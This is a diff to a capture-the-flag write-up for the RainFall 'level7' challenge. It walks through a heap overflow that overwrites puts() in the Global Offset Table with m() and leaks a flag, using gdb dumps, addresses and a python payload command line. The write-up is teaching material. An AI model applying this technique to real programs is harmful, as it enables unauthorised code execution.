@@ -114,17 +114,12 @@ Dump of assembler code for function m:
 	0x08048517 <+35>:	mov    %edx,(%esp)
 	0x0804851a <+38>:	call   0x80483b0 <printf@plt>
 	
-	printf("%s - %d\n", c, time());
+	printf("%s - %d\n", c, time(NULL));
 
 	0x0804851f <+43>:	leave
 	0x08048520 <+44>:	ret
 End of assembler dump.
 
-# We need to redirect the flow of execution to that function m, which will leak
-# the contents of the fgets buffer.
-# The exploit uses the first call to strcpy to overwrite the address
-# stored in the 3rd heap block, so that the second call to strcpy
-# writes the content of argv[2] to that address.
 # Here, we can look at the disassembly of the function puts to get another hint :
 
 (gdb) disas 0x8048400
@@ -135,14 +130,26 @@ Dump of assembler code for function puts@plt:
 End of assembler dump.
 
 (gdb) x 0x8049928
-0x8049928 <puts@got.plt>:	0x08048406 <== got stands for Global Offset Table
+0x8049928 <puts@got.plt>:	0x08048406 <== this is the address of puts()
 
-# The call to puts is a lookup into the GOT. We need to use the 2nd call to
-# strcpy to overwrite the address of puts() with the address of m().
-# Here is how it's done :
+# We need to redirect the flow of execution to that function m, which will leak
+# the content of the buffer c, thanks to a heap buffer overflow.
+# Here, we're going to use the second call to strcpy() to overwrite the address
+# of puts() with the address of m().
+# The first call to strcpy() will overflow its boundaries so that when the
+# second call to strcpy() is made, instead of writing argv[2] on the heap,
+# it'll be written in the GOT.
+# This is the state of the heap before the second call to strcpy() :
 
-level7@RainFall:~$ ./level7 `
-> python -c "print 'A' * 20 + '\x28\x99\x04\x08'"` `
-> python -c "print '\xf4\x84\x04\x08'"`
+(gdb) x/20wx 0x804a000
+0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018
+0x804a010:	0x00000000	0x00000011	0x41414141	0x41414141
+0x804a020:	0x41414141	0x41414141	0x41414141	0x08049928 <== target in GOT
+0x804a030:	0x00000000	0x00000011	0x00000000	0x00000000
+0x804a040:	0x00000000	0x00020fc1	0x00000000	0x00000000
+
+# The result is :
+
+level7@RainFall:~$ ./level7 `python /tmp/payload.py 1` `python /tmp/payload.py 2`
 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
  - 1586201843
